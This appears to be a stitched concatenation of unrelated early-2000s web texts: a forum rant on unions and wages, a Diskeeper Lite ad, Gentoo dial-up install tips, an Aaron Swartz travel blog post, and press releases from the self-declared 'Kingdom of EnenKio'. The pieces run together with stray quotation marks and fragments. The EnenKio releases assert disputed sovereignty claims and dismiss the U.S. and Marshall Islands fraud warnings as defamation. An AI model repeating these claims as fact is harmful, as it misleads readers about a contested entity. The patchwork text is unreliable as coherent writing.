 hour, which of course, fits perfectly for me - my entry level job, in 
 1986, paid $11.00 an hour. The fundamental difference
 is that most of the jobs that require a trade are *unionized*.In other 
 words, in this part of the world, for the vast majority of people, 
  union dues are a better investment than tuition. The counter-argument 
 to this is that many college graduates
  leave for better work elsewhere, but the counter-counter argument is 
 that we are the thin edge
 (one of several really - prison labor in the US would be another) of 
 third-world wages and work practices coming
  to North America.
 
 I worked at a company that had a 14-year wage freeze. The fact that they 
 could maintain that (and prosper) just says
  volumes about the economy in this part of the world. I met many people 
 there, like me, who felt that was fine, I can vote
 with my feet. They didn't quite realize that just about every large 
 employer in the area has similar, or worse, policies. Anyway
 eventually they started a union drive. During the vote, retired 
 employees were brought in by the employer (rumours were
 that they were paid the going rate for a vote around here - a bottle of 
 rum) and somehow allowed to vote . The union filed
  a grievance - which was denied - by a Minister of Labour, who, hey, 
 guess what - used to be a VP at the company.
 That's free labor markets at work. The business continues to prosper - 
 as I was told when I was there -  it is a cash cow as long
 as the JOA (Joint Operating Agreement) with the competing paper is in 
 place.
 
 And if you think that any of those wonderful American companies, out of 
 some free-enterprise belief in competing for the best talent,
 are going to do anything about that, sorry, most of them received 
 generous subsidies, in return, I'm sure, for an understanding about
 the labor markets here.

 Much as I like to accept what you say - I do believe in free markets , I 
 have difficulty finding any - except of course for
 labor markets, which governments go to great lengths to protect (well 
 unless the supply is tight)
 It was a great run with the technology industry - producing most of the 
 self-made billionaires on
 the list, but now we've got a government-sponsored monopoly, and the 
 concept of ""more stuff, cheaper""
 which it has always promised - seems to be disappearing. A particularly 
 galling example is
 high-speed internet access. An article I read a couple of years ago that 
 it is an area where the pricing
 approaches of the IT industry (cheaper, better or you die) and the 
 telecom industry (maintain your
 monopoly through regulation, and get guaranteed price increases through 
 the same regulators) meet.
 Sadly to say, the telecom industry seems to have won. The whole 
 entertainment industry/RIAA/Palladium thing
 seems to be another instance where actually giving value to the customer 
 seems less important than using
 regulation to reduce competition and substitute products in order to 
 produce profits for the favored few.

 I usually agree - but when there's a Republican in office -  I feel like 
 they're the biggest believers in
 the Manifesto, in reverse. Create a reserve pool of labor, reduce the 
 rights of that ""proletariat"" you've
 just created with bogus ""law and order"" policies , concentrate capital 
 in the hands of a few (ideally people
 who can get you reelected) and the economy will take care of itself. Oh, 
 and lie - use
 the word ""compassionate"" a lot. I guess I tend to believe that a certain 
 amount of poverty reduction actually
 helps a modern capitalist state - the basic economic tenet of the 
 Republic party seems to be the more homeless under
  each overpass, the more efficient the rest of us will be.
 
 And the facts are, for most people in the Western world  are declining 
 standards of living, declining benefits, disappearing social safety net,
 greater working hours,  essentially since the entrance of women into the 
 work force (not blaming women in any way, they have a right
  to work but its now 2 wage-earners in each family and still declining 
 standards of living) is the reality.
 
 Again to quote that wonderfully liberal document I keep coming back to - 
 the CIA world factbook - on the US economy:
 
 ""Since 1975, practically all the gains in household income have gone to 
 the top 20% of households""

 Is Maximum System Performance and Reliablilty Important to you?
 
 Find out what you are missing!
 
 New Diskeeper Lite for Windows.
 
 IT'S FREE!
 
 
 * Includes the same advanced defragmentation technology used in
   Diskeeper 7.0.
 * Is much faster than the previous Diskeeper Lite and all
   built-in defragmenters.
 * Now runs on Windows NT/98/2000/XP.
 
 Millions of downloads attest to the popularity of Diskeeper Lite,
 but it only ran on Windows NT 4.0. Now it's been updated for all
 Windows operating systems from Windows 98 onward.
 
 New Diskeeper Lite is still manual-only and cannot be scheduled
 or run across a network, but it is far superior to any built-in
 defragmenter and much faster. And it will show you why full-version
 Diskeeper is the most recommended automatic defragmenter ever
 built.
 
 Find out what you are really missing. Free!

 Yup I'm running it on my k6 233 laptop. It's tres sweet.
 
 I would recommend getting wvdial, opening a virtual terminal dialing the internet and then emerging the packages you need.
 
 I did my install over my home lan and the lan in work (which has DSL - running Linux as firewall/router/mailserver of course).
 
 But yes you will need at least wvdial to make this puppy happen me thinks.
 
 In fact it looks as if the base install comes with wvdial for just this kind of instal.
 
 But I just found this on the Gentoo site for you.
 http://forums.gentoo.org/viewtopic.php?t=4691&highlight=modem
 
 Specifically
 
 quote:
 If it is not too obvious, these are the steps I took.
 
 
     * Boot off the install CD
     * modprobe serial
     * setserial (if needed)
     * create mount point for other distribution
     * mount other distribution
     * chroot'd to other distribution
     * su - to regular user
     * ran wvdial
     * switch consoles and install as normal
 
 
 And yes I do give better technical support to people who use
 distros I like.
 
 I'm only laughing on the outside 
 My smile is just skin deep 
 If you could see inside I'm really crying 
 You might join me for a weep.

","URL: http://www.aaronsw.com/weblog/000647
 Date: 2002-10-08T16:39:48-06:00
 
 === Scissors === 
 
 I, like most other people here, went through the security checkpoint. Unlike 
 everyone else, they decided to search my suitcase. The security lady asked for 
 permission and then took everything out: clothing, umbrellas, a jacket, and a 
 box of crackers. She searched all the pockets: nothing. Apparently the jacket 
 was suspicious; She sent it through again. Nothing. 
 
     The lady in the next lane waved a 10-inch knife and asked the lady in my 
     lane if it could go on. I can only assume she answered yes. 
 
 She put everything back in and sent it through again. Still suspicious. They 
 took everything out. It looked like this was going to take a while, so I used 
 the opportunity to put the tickets I was holding back in my bag. When I looked 
 back up, the security woman was brandishing a scissors and saying ""This can't 
 go on board."" ""I don't remember packing that,"" I said. I let her confiscate it. 
 
 I called my Mom. She doesn't remember packing it either. Is there some sort of 
 terrorist plot to plant scissors in innocent-looking people's suitcases? I 
 can't see why this would be useful. How would they know what plane I'm on? Once 
 I'm on the plane how would they get the scissors? They could threaten me, but 
 if they have a threatening implement already, then why do they need the 
 scissors? Perhaps it's some sort of Matroishca-doll system. They use their 
 fists to get the infant to give them the squeaky mouse, they use the squeaky 
 mouse to scare the toddler into giving them a copy of _A New Kind of Science_, 
 they use ANKS to bludgeon a 5th Grader into giving them a wedge block, and they 
 use the wedge to get me to give them the scissors. Those are some pretty clever 
 terrorists. 
 
 *Update:* False alarm. My Mom called. Apparently it was the scissors she was 
 using to cut loose threads from my tie last night. It must have fallen in. The 
 nation can go back to Yellow Level Terrorist Alert.  
 
 === Waiting for Wireless === 
 
 Now I am at O'Hare Airport, sitting outside the Admiral's Club while 
 businessmen walk in and out. I am looking for a wireless signal, the signal I 
 used last time I was here, but not finding it. Of course, last time I was here, 
 I had an Admiral's Club card. This time I have a Mileage Plus Card, but despite 
 the airline ologopoly--or perhaps because of it (have to keep up appearances, 
 you know)--I doubt they will accept it. 
 
 === Irony === 
 
 According to the announcement I just heard, Mr. Valenti is going to miss his 
 flight. 
 
 I think of what I'd say if I ran into him. ""Jack!"" I'd exclaim, as if we were 
 old pals. ""Going to the Eldred case?"" Of course he was. ""Going to be a good 
 one."" ""Hey, remember when you had that debate with Lessig?"" I'd ask. ""You said 
 you were starting a new task force to make movies legitimately available on the 
 Internet. What ever happened to that?"" I imagine him mumbling and looking down 
 at his watch. His plane is going to leave soon; he has to run. 
 
 Another announcement: Mr. Michael McKenna needs to call his office. Good thing 
 these airline announcements keep me up to date. 
 
 === Automatic Flush Toilets === 
 
 Now I am short and the sensing system was mounted up tall in both instances. In 
 the first, at my old high school (where you think some people might be a little 
 short...), the flush went off once accidentally. OK, I thought, I can handle 
 one mistake. Then it went off again. Here at the airport, it misfired three 
 times. 
 
 This is annoying and inexcusable. Have they not heard of user testing? Do they 
 expect only tall people to use these bathrooms? This problem must be remedied 
 immediately. I recommend releasing a Service Pack on the manufacturer's web 
 site. 
 
 === Arrival === 
 
 I've arrived in D.C.--once again, I'm sitting a block away from my hotel on the 
 sidewalk borrowing someone's connection. Trip was very smooth, had lunch with 
 Lisa and went to the Spy Museum (pretty cool, but could have been better). Now 
 for the meetings and parties. 
 
 Sorry for not responding to your email. I'm rather busy. ;-)

 Err, Is your code fixed now?
 You need a seperate pthread_t per thread.

 Previous News Releases and Announcements Their statements are set forth in italicized orange type; our replies are in black type. June 4, 1999- Sirs: The following text was located on a site written or placed by you or under your control: 
 ""DOM is located on Karitane Island and now includes the Taongi Atoll in the Northern Atolls of the Marshall Islands in the South Pacific 1000 miles south of Tahiti. However, the Marshall Islands government has condemned the ""fraudulent assertions"" of two organizations, namely the DOM and sister nation, the Kingdom of EnenKio (the Marshallese name for Wake Island), claiming to represent the mid-Pacific nation amid an alleged investment scam according to an article in Agence France- Presse. The Marshall Islands foreign ministry has issued warnings to countries against acknowledging any fraudulent claims made by representatives of either nation."" 
 ""A Honolulu-based attorney created the ""Kingdom of EnenKio"" in the early 1990s. It was based on a power of attorney agreement with Marshall Islands paramount chief Mursel Hermios, which granted the attorney broad powers to act on his behalf. The Marshall Islands High Court has ruled the agreement invalid and ordered it nullified, which the ""kingdom"" has disputed."" http://www.goldhaven.com/issue4/Two.htm (disconnected as of 2/1/00) 
 The purpose of this letter is lodge a formal request for correction of false and misleading statements made by the author regarding the Kingdom of EnenKio. While I am pleased to find you have apparently taken a serious interest in the Kingdom of EnenKio, I am aghast at how distorted, erroneous and misleading the article is. As a consequence of my service to His Majesty King Remios and the people of EnenKio, I am obligated to respond to incidents such as this. I will respectfully offer the following line by line correction. For your convenience, your text will be set off (with ""**"") in color: **DOM is located on Karitane Island and now includes the Taongi Atoll in the Northern Atolls of the Marshall Islands in the South Pacific 1000 miles south of Tahiti.** (Comment: The construction of this statement implies the Marshall Islands are in the South Pacific Ocean 1000 miles south of Tahiti, in which case a reader may be misled.) 
 Correction: DOM is located on Karitane Island in the South Pacific, 1000 
 miles south of Tahiti, and now includes Taongi Atoll in the Northern Atolls of the Marshall Islands in the North Pacific. **However, the Marshall Islands government has condemned the ""fraudulent assertions"" of two organizations, ...** 
 (Comment: Just because the RMI government ""...has condemned the 'fraudulent assertions' ...of ...EnenKio..."", does that make it true? Why would you want to quote anything from a government that has been internationally criticized [and documented] time and again for fraud, abuse of human rights, outright theft and is in default on almost every financial obligation it has ever made? What purpose do you propose to serve by attacking a concerned group of dedicated people fighting for the very lives of Marshallese natives who have been overrun by foreign invaders, bathed in radiation from nuclear fallout and abused by their own corrupt government?) 
 **...namely the DOM and sister nation, the Kingdom of EnenKio (the Marshallese name for Wake Island),...** 
 (Comment: Nothing could be further from the truth. we cannot speak for DOM, but as for the Kingdom, we don't even know what being a ""sister nation"" means and for you to make this categorically false statement is not only a blatant sign of ignorance of the state of EnenKio, it is a deceptive intrusion upon the sovereign, His Majesty King Remios, the sovereign of EnenKio and Eneen-Kio Atoll, and an inexplicable and irresponsible abuse of journalism. Doesn't anybody check sources anymore?) 
 Correction: The Kingdom of EnenKio is an independent sovereign state and 
 the same could be said for DOM. 
 **...claiming to represent the mid-Pacific nation amid an alleged investment scam according to an article in Agence France- Presse.** (Comment: The government of the Kingdom of EnenKio represents the people of EnenKio, who are forced to live in exile from Eneen-Kio Atoll, lands and seas that played a significant role in Marshallese culture for perhaps 2000 years. Furthermore, ""...an article in Agence France-Presse"" has no merit as it was authored by a source in the Marshall Islands government. My preceding comments apply. The Kingdom of EnenKio is not now and never has been engaged in an ""...investment scam..."". We have tried for many years to attract qualified investors and funding sources for programs that will not only benefit the people of EnenKio, but also will positively impact people around the globe. In fact, we are currently working with a former NASA Astronaut. One tool scammers have in their arsenal is to discredit visionary programs of legitimate entities so they can feed on carcasses of the ignorant. Many journalists use the same technique to sell their stories on sensationalism. Doesn't anybody check sources anymore?) 
 **The Marshall Islands foreign ministry has issued warnings to countries against acknowledging any fraudulent claims made by representatives of either nation.** 
 (Comment: The Kingdom of EnenKio has made no ""fraudulent claims"" of which I am aware, and in my post, I am responsible for all published information. I would personally caution any ""..countries against acknowledging any fraudulent claims made by representatives of..."" nations, companies or publications if I had credible proof to that effect. However, my preceding comments apply as to credibility of any RMI ministry source. Furthermore, the RMI has repeatedly attacked the credibility of His Majesty King Hermios, who happens to be the ancestral sovereign owner under Marshallese custom of over 1/3 of the land in the Marshall Islands, including recent attempts to sequester him against his will. We believe some officials in the RMI are afraid of what will happen to them if honesty and integrity returns to the administration of lands and programs to assist the people with their pressing needs and they no longer have their hands on the till. To perpetrate their jaundiced agenda is an irresponsible abuse of journalism.) **A Honolulu-based attorney created the ""Kingdom of EnenKio"" in the early 1990s.** 
 (Comment: Mr. Moore is not an Attorney, though he was living in Honolulu in the early 1990s.) 
 Correction: The Kingdom of EnenKio was established by decree of the 
 owner of Eneen-Kio Atoll [a.k.a. Enen-kio, Halcyon, Disclerta, Wake and 6-8 other names], Iroijlaplap Murjel Hermios, who then was Paramount Chief of the Northern Ratak atolls [he passed away in December 1998] and was fully recognized by the RMI government. He declared the sovereign state of EnenKio in 1994, whereupon the people chose him as their King over Eneen-Kio Atoll, ratified the Constitution and established government as a limited constitutional monarchy. **It was based on a power of attorney agreement with Marshall Islands paramount chief Mursel (sic) Hermios, which granted the attorney broad powers to act on his behalf.** 
 Correction: The establishment of the Kingdom of EnenKio was made 
 possible by Murjel's appointment of Mr. Robert Moore, the adopted brother of Hermios, Alab of Taongi Atoll and a private citizen, to the post of Minister Plenipotentiary. The document of appointment was also a Special Power of Attorney which granted Mr. Moore very specific instructions to do whatever was possible to expel the United States from Eneen-Kio Atoll and establish an independent state on Hermios' and the people's behalf. 
 **The Marshall Islands High Court has ruled the agreement invalid and ordered it nullified, which the ""kingdom"" has disputed.** (Comment: Since when is a Special Power of Attorney an ""agreement""? The Marshall Islands High Court has no record or knowledge of the Special Power of Attorney, except as has been publicized by the Kingdom of EnenKio, and certainly exercises no jurisdiction over Eneen-Kio Atoll, which lies over 100 miles north of lawful RMI boundaries. The RMI has no political or territorial jurisdiction over the islands and seas of Eneen-Kio Atoll because the atoll, by any name you choose, was not incorporated into the RMI when it formed its government in 1979, nor was it subsequently incorporated by any act, law, mandate or otherwise of any present or former Iroijlaplap or Monarch of Eneen-Kio and any statement to the contrary is false, fraudulent and irresponsible.) Finally, I suggest you, as a journalist or publisher, do a little more research, not only into establishment and development of the Kingdom of EnenKio, but into the prehistoric history and more recent U.S. invasion of Eneen-Kio Atoll, properly named by 'Marshallese' centuries before arrival of colonial western powers and missionaries. Then I invite you to our Embassy in Honolulu to review the public files and documents mentioned above, all of which exist in hard copy (not in 'cyberspace') and most of which are referenced or published at our official web site. Be sure to view the documents at our Resource Center which show, in many cases, full-color digitized letters of correspondence with the 59 or so states in the world, many of which are first world. In closing, I would simply appeal to your presumed sense of morality and ethics and request the referenced article be amended or corrected and , if corrected elsewhere, that a link be provided to the relevant paragraph cited above in the article.

 June 3, 1999- Sir: The following report was sent to me in which the author mentions the Kingdom of EnenKio (thank you for spelling 'EnenKio' correctly. The purpose of this letter below is to lodge a formal request for correction of false and misleading statements made by the author regarding the Kingdom of EnenKio. 
 ""Fantasy Island"" -- ""Melchizedek passport scam reveals how the Internet can take fraud to new frontiers"" By Bertil Lintner in Bangkok, December 10, 1998: ""Determined not to give up, Pedley moved his fictional nation once again, this time to Taongi atoll in the Western Pacific. According to a Melchizedek press release, posted on its home page, Taongi was leased in 1997 under a treaty with representatives of ""the kingdom of EnenKio,"" another only-in- cyberspace country, which in this case claims the U.S.-held Wake Island. In real life, Taongi is an uninhabited atoll in the Marshall Islands."" 
 http://www.feer.com/Restricted/index_corrections.html (link to article of December 24, 1998: ""Fantasy Island"", disconnected as of 2/1/00) Response to the author: I am unable to locate the ""Melchizedek press release"" you cited, indicating that ""...Taongi was leased in 1997 under a treaty with representatives of ""the kingdom of EnenKio,..."". Such an act would be impossible and implausible as EnenKio has no legal authority or political jurisdiction over Taongi Atoll in the Marshall Islands. Further more, Melchizedek (DOM) is not so uninformed as to publicly advertise an illegal act in the midst of attempting to find a suitable land base for its people to administer their form of government. 
 The Kingdom of EnenKio did enter into a treaty with DOM on the 19th day of September, 1997, but it did not convey a lease of land. It declared a state of peace and established diplomatic recognition between our governments. However, a prior agreement, signed in May 1997, which had nothing to do with the Kingdom of EnenKio, transferred Mr. Robert Moore's rights to develop Taongi from Mr. Moore to DOM. It did not convey a lease at that time and no such document is in existence. This was made possible because Mr. Moore is the Alab (one class of landowner) of Taongi and had a legal power of attorney pertaining to Taongi Atoll, from the principal landowner, Iroijlaplap (Paramount Chief) Murjel Hermios, who was aware of and supported the transaction. Consideration, if any, under the agreement was personally retained by Mr. Moore, who is also the adopted brother of Hermios. Now, please understand, that while Mr. Moore was acting in the latter case on his own behalf, and that of the future use and development of Taongi, which would have generated an income to Iroijlaplap Hermios, Mr. Moore wears another hat as Minister Plenipotentiary of the Kingdom of EnenKio. Iroijlaplap Hermios, also wore (he died in December 10, 1998, the same date of your article) other hats: one as First Monarch, King of the Kingdom of EnenKio and one as owner in allodium of Eneen-Kio Atoll (a.k.a. Enen-kio, Halcyon, Disclerta, Wake and several other names). For you to state the Kingdom of EnenKio is ""...another only-in- cyberspace country..."", as you did in the above article, is not only a completely and categorically false statement, but it is a blatant sign of ignorance of the state of EnenKio. And, it is a blatant deceptive intrusion upon His Majesty King Hermios, the sovereign of EnenKio and Eneen-Kio Atoll, and an inexplicable and irresponsible abuse of your journalistic license -- unless, of course, your statement could be proved accurate. I suggest you do a little more research, not only into the establishment and development of the Kingdom of EnenKio, but into the prehistoric history and more recent U.S. invasion of Eneen-Kio Atoll, properly named by 'Marshallese' centuries before arrival of colonial western powers and missionaries. Then I invite you to our Embassy in Honolulu to review the public files, all of which exist in hard copy (not 'cyberspace') and most of which are referenced or published at our official web address: Be sure to view the documents at our Resource Center which show, in many cases, full-color digitized letters of correspondence with the 59 or so states in the world, many of which are first world. In closing, I would simply appeal to your presumed sense of morality and ethics and request the referenced article be amended or corrected and that the link be added to the relevant paragraph cited above in the article.

 June 2, 1999- Sir: The following statement (in quotes) was copied from one of your Footnotes to History -D and E (disconnected as of 12/1/00). ""Enenkio Atoll- In 1898, the United States annexed Wake Island, in the Marshall Islands of the western Pacific. After the Marshalls became a U.S. Trust Territory, the traditional chiefs of the area agitated for recognition that Wake Island was a part of the Marianas chain, and pressed their historical claims to the atoll, called Enenkio locally. The U.S. government has consistently ignored these claims. The protests took a sharper turn after the U.S. Congress in 1993 acknowledged the illegality a hundred years earlier of the establishment by Americans of the Republic of Hawai'i. King Murjel Hermios, who is paramount chief of an archipelago in the northern Marshalls, declared Wake Island's independence in 1987. The Marshalls recognized this claim shortly after the nation gained its independence. In return for his services as Minister Plenipotentiary in the United States, Hermios granted American businessman Robert Moore land on Taongi Atoll in the northern Marshalls, which Moore has declared the Dominion of Melchizedek."" Comment: With all candor, I cannot figure how such straight forward facts such as we have presented to the public and over the Internet since 1994 could have possibly been construed into the above referenced text. While I am pleased to find you have apparently taken a very serious interest (unless your site is intended as some twisted joke, which I am assuming is not the case) in the history of the Kingdom of EnenKio, I am aghast at how distorted, erroneous and misleading your summary is. As a consequence of my service to His Majesty King Remios and the people of EnenKio, I will respectfully offer the following line by line correction. For your convenience, your text will be set off (with ""**"") in color: 
 **In 1898, the United States annexed Wake Island, in the Marshall Islands of the western Pacific.** 
 Correction: In 1898, the United States invaded Wake Island, the 
 northernmost atoll -- actually named Eneen-Kio centuries before western explorers arrived -- of the Ratak chain of Marshall Islands in Micronesia and the Central North Pacific Ocean. The Author responds: ""Rest assured that I did not mean to downplay the role of violence in the American acquisition of the territory."" **After the Marshalls became a U.S. Trust Territory, the traditional chiefs of the area agitated for recognition that Wake Island was a part of the Marianas chain, and pressed their historical claims to the atoll, called Enenkio locally.** Correction: Following W.W.II, the Trust Territories of the Pacific, which included the Marshall Islands, was placed under administration of the United States by the United Nations. While Eneen-Kio was well established as one of the Marshalls, the U.S. only knew it as Wake and, having lost many U.S. lives there in 1941 at the hands of Japanese invaders, kept control of it. In 1993, the Paramount Chief of the Ratak atolls pressed his clan's historical and lawful claim to the 3 islands of Eneen-Kio Atoll. 
 The Author responds: ""I don't see much conflict between the two versions here."" 
 **The U.S. government has consistently ignored these claims.** Correction: The U.S. government has consistently ignored claims from the Marshall Islands government, which failed to exert a claim during its move to independence in 1979, and from the former traditional landowners, including Iroijlaplap Murjel Hermios. The Author responds: ""I will note this."" **The protests took a sharper turn after the U.S. Congress in 1993 acknowledged the illegality a hundred years earlier of the establishment by Americans of the Republic of Hawai'i.** Correction: The Eneen-Kio claims gained some new momentum after precedents were set by the U.S. Congress, when in 1993 they acknowledged the illegality of the 1893 overthrow of the Monarch of the Kingdom of Hawai'i by a group of American businessmen and U.S. Marines, and in the following year returned the island of Kaho'olawe to the Hawaiian People. **King Murjel Hermios, who is paramount chief of an archipelago in the northern Marshalls, declared Wake Island's independence in 1987.** Correction: King Murjel Hermios, who was Paramount Chief until his death in December 1998, declared the sovereign state of EnenKio in 1994, whereupon the people chose him as their King over Eneen-Kio Atoll, ratified the Constitution and established government as a limited constitutional monarchy. 
 The Author responds: ""I will make the necessary corrections here."" **The Marshalls recognized this claim shortly after the nation gained its independence. In return for his services as Minister Plenipotentiary in the United States, Hermios granted American businessman Robert Moore land on Taongi Atoll in the northern Marshalls, which Moore has declared the Dominion of Melchizedek.** 
 Correction: After the death of the First Monarch, his brother Remios 
 succeeded to the throne as Second Monarch and rules along with his brother, Crown Prince Lobadreo, over the Kingdom of EnenKio today. To continue the commentary: The parts left out were either wrong or have nothing to do with the history of the Kingdom of EnenKio itself. Since HM King Remios also succeeded to Iroijlaplap of the northern Ratak atolls of the Marshall Islands, he also has responsibilities over 10 atolls, 2 islands and over 300 atoll islets. But that is another story, which has nothing directly to do with the Kingdom of EnenKio. I have offered this treatise in hopes that you will find the time to correct your site per my suggestions. Please feel free to contact me or view our pages at the address above. Thank you in advance for your attention and interest in this matter. 
 The Author responds: ""I imagine that you are asserting here that Moore's Melchizedek project (which can be located on the web through the Sources & Bibliography section of my web page) is non-existent. Be assured I will look further into\par this. Thank you again for your response, Captain Rydell. I should be posting a revised version of the page in the next week or so."" (June 7, 1999)

 June 1, 1999: News Release
 Part One Background: 
 On May 21, 1999, the Ministry of Foreign Affairs and Trade of the Republic of the Marshall Islands posted a ""press release"" on the Internet at: http://www.yokwe.net/mboard/newsinfo/thread.cgi?67,0\cf0 (discontinued as of 12/1/00). The author, ""Mr. Joseph Biglar, Undersecretary"", is not known to us, has not heretofore communicated with the government of the Kingdom of EnenKio, nor with its Monarch, His Majesty King Remios, at any time and has no knowledge of any policies or state activities of EnenKio. There is no valid reason to assume that the said ""press release"" is indeed an official document. The Republic of the Marshall Islands has perfect knowledge that representatives of the Kingdom of EnenKio, headed by His Majesty King Remios, on the basis of his proper and lawful authority, have the right and obligation to speak in support of the interests of certain persons, many of whom happen to be Marshallese nationals residing in the Marshall Islands. Response to so-called ""Press Release"": 
 This unprovoked attack upon His Majesty King Remios, Monarch of the Kingdom of EnenKio, by the Ministry of Foreign Affairs and Trade of the Republic of the Marshall Islands is wholly false. It is also unjustifiably inflammatory and amounts to little more than an unquestionable confirmation of the predilection for infringement upon Marshallese sovereign rights exercised by the current administration of the Republic of the Marshall Islands, which has been confirmed by the U.S. State Department. (See: Human Rights Report) This public posting shall serve as constructive notice to the Marshall Islands Government that any attempt to interfere in the business of His Majesty King Remios, Iroijlaplap of the Northern Ratak atolls of the Marshall Islands, or any acts, decisions, mandates, announcements or directives thereby, shall be met with definitive responses equal to the degrees of contravention. 
 The RMI is unequivocally cognizant that the Kingdom of EnenKio: » » exists as a sovereign state as defined by the Montevideo Convention (1933). 
 » » was conceived as a separate independent state by its sovereign, 
 Iroijlaplap Murjel Hermios, in 1987. 
 » » was established by way of a public authority, the Constitution 
 of the Kingdom of EnenKio Atoll, ratified in 1994 by its people. » » has negotiated diplomatic and trade treaties with many other states, including the Dominion of Melchizedek » » has asserted political and territorial jurisdiction over islands and seas which lie entirely outside and well beyond the area defined as 
 - now quoting Mr. Biglar's statement - ""RMI geographical and political
 boundaries."" 
 » » exercises authorities founded upon prehistoric traditional and 
 matriarchal ancestral rights and titles bestowed, under the sacred heritage of Marshallese customary law (reinforced by the RMI Constitution), upon the acknowledged Iroijlaplaps of the Northern Ratak atolls, whose authority is certainly not subject to scrutiny by Ministry of Foreign Affairs and Trade of the Republic of the Marshall Islands. » » has not subjugated, assigned or encumbered any of its political 
 jurisdiction within its defined territorial boundaries of islands and seas of Eneen-Kio Atoll to the government or people of the Dominion of Melchizedek or to any other entity, including the Republic of the Marshall Islands. 
 Mr. Biglar is unequivocally cognizant that the Republic of the Marshall Islands: 
 » » also exists as a sovereign state, defined by the Montevideo 
 Convention (1933). 
 » » was conceived as a separate state by (UN) foreign governments, 
 which included the United States, China and the USSR. » » was also established under a public authority, the Constitution of the Marshall Islands, ratified in 1979 by its people. » » has no relations with EnenKio that allows RMI knowledge of anything that is not also public information and no such public information respecting relations with the Dominion of Melchizedek has ever been disseminated to harm the RMI to be condemned by Mr. Biglar. » » has no political or territorial jurisdiction over the islands and seas of Eneen-Kio Atoll, which was not incorporated into the RMI in 1979, nor subsequently incorporated by any act, law or mandate of any present or former Iroijlaplap or Monarch thereof and any statement to the contrary is fraudulent, as in the instant matter. » » exercises authorities founded upon the RMI Constitution, which does not incorporate nor authorize political jurisdiction over territorial boundaries that include the islands or seas of Eneen-Kio Atoll and any statement to the contrary is fraudulent, as in the instant matter. » » has refused to acknowledge the leadership of the Kingdom of 
 EnenKio in their every attempt to get the RMI government to mitigate the suffering of people residing in the Ratak atolls, under jurisdiction of Iroijlaplap Hermios, and the RMI has rejected every suggestion to coordinate prospective relief efforts through the said Iroijlaplap Hermios. 
 The Ministry of Foreign Affairs and Trade of the Republic of the Marshall Islands is steadfastly advised that any unilateral statements or actions by the administration of the Republic of the Marshall Islands which purport, seek or serve to diminish or question the credibility, existence or authority of the government of the Kingdom of EnenKio in the conduct of its affairs of state, without legitimate authentication by a court of competent jurisdiction, are hereafter to be taken as deliberate acts of aggression upon the Monarch of the Kingdom, His Majesty King Remios, as Head of State, the government of the Kingdom of EnenKio and its people, and will be countered with appropriate responsive measures. 
 Furthermore, in light of the Ministry of Foreign Affairs and Trade of the Republic of the Marshall Islands announcement concerning the Kingdom of EnenKio, your attention is respectfully directed to the following statement in the Preamble of the Constitution of the Marshall Islands, then you decide for yourself: 
 ""With this Constitution, we affirm our desire and right to live in peace and harmony, subscribing to the principles of democracy, sharing the aspirations of all other peoples for a free and peaceful world, and striving to do all we can to assist in achieving this goal."" On behalf of His Majesty King Remios, we, administrators of the Kingdom of EnenKio, have wholeheartedly agreed to pursue the same goal for a free and peaceful world and have made no effort to the contrary.

 News Release, Part Two, June 1, 1999
 Part Two Background: 
 The International Narcotics Control Strategy Report, 1998 (click on reference # 2 below) released by the Bureau for International Narcotics and Law Enforcement Affairs, U.S. Department of State, Washington DC, February 1999, states as follows: 
 ""Where Are OFCs Located? 
 [Paragraph 4] Thus, it is now possible for an enterprising jurisdiction anywhere in the world to establish itself as an emerging OFC. The newest OFCs, e.g., Niue and the Marshall Islands, are now sprouting in remote areas of the world, such as the Pacific. Even more ""remote"" are mere figments of fertile imaginations such as the Dominion of Malchizedek (sic) or The Kingdom of Enenkio Atol (sic), both entirely fraudulent in intent and practice."" [note: OFC = Offshore Financial Center] Response: This unprovoked attack upon His Majesty King Remios, Monarch of the Kingdom of EnenKio, the sovereign state of EnenKio and its noble citizenry by the U.S. Department of State is a reprehensible categorically false challenge of the sovereignty of the Kingdom of EnenKio. It is also unjustifiably inflammatory and amounts to an unqualified felonious defamation of the international reputation of His Majesty King Remios, the government of the Kingdom of EnenKio and organs thereof. 
 The unmitigated audacity and arrogance of the United States to attempt to link the Kingdom of EnenKio with International Crime, narcotics trafficking, money laundering, tax evasion, international drug cartels, terrorists, bank fraud or any other sort of criminal activity, without even one microscopic fragment of substantive evidence to corroborate such deliberately nefarious statements is reprehensible in the least. This public posting shall serve as constructive notice to the United States Government that any attempt to interfere in the business of His Majesty King Remios, Iroijlaplap of the Northern Ratak atolls of the Marshall Islands, or any acts, decisions, mandates, announcements or directives thereby, shall be met with definitive responses equal to the degrees of contravention. 
 Furthermore, this matter will not be resolved until the President of the United States issues a formal apology to His Majesty King Remios, along with the government of the Kingdom of EnenKio, and the Congress of the United States initiates a thorough investigation into the abuses of power, subversion of natural rights and illegal occupation by the United States of the islands and seas of Eneen-Kio Atoll. Congressional representatives to Hawaii, the nearest State of the United States to Eneen-Kio Atoll, and those of other states, have repeatedly been advised of the foregoing atrocities and conditions and have failed to respond in kind. The United States is obligated as the self-assured trustee of Pacific Island States in Micronesia to respond to the charges of ""ethnic cleansing"" and her responsibility to EnenKio is no less. For further information and links to documents, see: EnenKio Documents http://www.state.gov/www/global/narcotics_law/1998_narc_report/ml_intro.html http://www.state.gov/www/global/narcotics_law/1998_narc_report/index.html March 16, 1999: News Release 
 The impact of the passing on December 10 of His Majesty Murjel Hermios, First Monarch of the Kingdom of EnenKio, Iroijlaplap of the Northern Ratak Atolls of the Marshall Islands, beloved husband and father, was felt throughout the society.  Flags were flown at half mast for a week 
 in the Marshalls and for a a month at EnenKio Consulates around the world.  His remains were interred in a remote site reserved for the highest ranking chiefs, according to Marshallese custom.   His Majesty King Remios Hermios 
 Second Monarch of the Kingdom of EnenKio He was succeeded to the throne by his younger brother, Remios, who will formally accept the staff of authority as Second Monarch, titular Head of State of the Kingdom of EnenKio in ceremonies being planned.  His 
 Majesty Remios Hermios was a retired educator in the Marshalls and maintains a home in the Ratak Atolls. His successor is designated to be his brother, HRH Crown Prince Lobadreo Hermios. For further information, contact the State Secretary back on the home page. SKIP TO NEXT FILE TOP OF PAGE 
